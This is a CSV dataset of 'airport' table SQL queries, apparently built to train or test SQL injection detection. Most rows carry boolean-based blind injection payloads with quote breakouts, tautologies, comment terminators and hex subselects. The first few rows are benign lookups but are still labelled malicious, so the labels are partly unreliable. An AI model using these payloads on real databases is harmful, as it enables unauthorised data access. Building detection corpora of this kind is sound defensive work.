full_query,label,template_id,malicious_input,malicious_input_desc
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '4839';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT(.',.)""),(';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT'FvwuwF<'"">FOQSLw';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 9715=3511-- yzFP';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 1466=1466-- uFBe';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 5339=9991-- qOBd';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 1466=1466-- GFMS';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 3008=1114-- eIaL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 1466=1466-- IDZA';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 2761=7555 AND ('bTkZ'='bTkZ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 1466=1466 AND ('qzDu'='qzDu';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AND 9628=9195 AND (('cvbb'='cvbb';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AND 1466=1466 AND (('Msau'='Msau';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'))) AND 2886=5852 AND ((('JskO'='JskO';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'))) AND 1466=1466 AND ((('QkDo'='QkDo';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 7575=8712 AND 'VFMl'='VFMl';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 1466=1466 AND 'OVOd'='OVOd';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 6860=6314 AND ('UaAP' LIKE 'UaAP';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AND 1466=1466 AND ('aAGJ' LIKE 'aAGJ';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AND 2080=2793 AND (('xNsy' LIKE 'xNsy';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AND 1466=1466 AND (('tcwe' LIKE 'tcwe';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'))) AND 3905=4474 AND ((('QjWO' LIKE 'QjWO';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'))) AND 1466=1466 AND ((('pQNj' LIKE 'pQNj';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT%' AND 7823=9808 AND 'ymoD%'='ymoD';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT%' AND 1466=1466 AND 'Dmhv%'='Dmhv';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 3377=3541 AND 'hfot' LIKE 'hfot';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 1466=1466 AND 'ZHGq' LIKE 'ZHGq';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AND 9221=8906 AND (""bijf""=""bijf';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AND 1466=1466 AND (""kkhC""=""kkhC';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AND 1431=6646 AND ((""DRaj""=""DRaj';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AND 1466=1466 AND ((""TZrd""=""TZrd';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""))) AND 6854=5449 AND (((""eyrp""=""eyrp';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""))) AND 1466=1466 AND (((""SBJz""=""SBJz';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 1669=2120 AND ""KzrL""=""KzrL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 1466=1466 AND ""DueI""=""DueI';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AND 9557=6872 AND (""VJgb"" LIKE ""VJgb';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AND 1466=1466 AND (""eSSw"" LIKE ""eSSw';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AND 3346=4882 AND ((""TRDG"" LIKE ""TRDG';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AND 1466=1466 AND ((""Febh"" LIKE ""Febh';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""))) AND 7152=4556 AND (((""Yhwq"" LIKE ""Yhwq';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""))) AND 1466=1466 AND (((""dblW"" LIKE ""dblW';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 7107=2591 AND ""ouSj"" LIKE ""ouSj';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" AND 1466=1466 AND ""UTsl"" LIKE ""UTsl';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 3068=4901 OR 'eKtG'='XCtB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' AND 1466=1466 OR 'xElb'='SbiY';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') WHERE 1876=1876 AND 6255=5480-- rAhb';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') WHERE 6935=6935 AND 1466=1466-- AFSm';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") WHERE 1735=1735 AND 9436=3323-- OpBg';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") WHERE 9004=9004 AND 1466=1466-- Hxga';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' WHERE 5824=5824 AND 3002=2867-- Zxqh';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' WHERE 3056=3056 AND 1466=1466-- sLan';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" WHERE 3590=3590 AND 7952=2367-- FZsd';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"" WHERE 5287=5287 AND 1466=1466-- XpIR';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'||(SELECT 0x6c416a69 WHERE 9755=9755 AND 7960=4157)||'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'||(SELECT 0x4b544873 WHERE 3203=3203 AND 1466=1466)||'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'||(SELECT 0x64526764 FROM DUAL WHERE 3672=3672 AND 6233=9012)||'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'||(SELECT 0x51727361 FROM DUAL WHERE 4830=4830 AND 1466=1466)||'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'+(SELECT 0x4277564a WHERE 2894=2894 AND 4434=1066)+'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT'+(SELECT 0x74456d74 WHERE 1390=1390 AND 1466=1466)+'';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT||(SELECT 0x43684e75 FROM DUAL WHERE 1414=1414 AND 7922=2465)||';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT||(SELECT 0x45655451 FROM DUAL WHERE 8728=8728 AND 1466=1466)||';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT||(SELECT 0x77555a6e WHERE 1754=1754 AND 4661=1697)||';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT||(SELECT 0x5a666c7a WHERE 1233=1233 AND 1466=1466)||';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT+(SELECT 0x756a6a4d WHERE 7458=7458 AND 8209=2254)+';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT+(SELECT 0x67526f6b WHERE 1377=1377 AND 1466=1466)+';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AS AQDV WHERE 9188=9188 AND 9049=8659-- vFsq';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT')) AS NWdm WHERE 8682=8682 AND 1466=1466-- hlIX';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AS HOGX WHERE 6612=6612 AND 7323=3033-- UZvt';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"")) AS QlVp WHERE 9400=9400 AND 1466=1466-- cuzo';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AS ipQw WHERE 8356=8356 AND 5825=2234-- xgtH';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT') AS ekgw WHERE 5440=5440 AND 1466=1466-- yGMI';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AS orhl WHERE 6977=6977 AND 3621=6543-- dKGm';",1,airport-S1,Unknown,Unknown
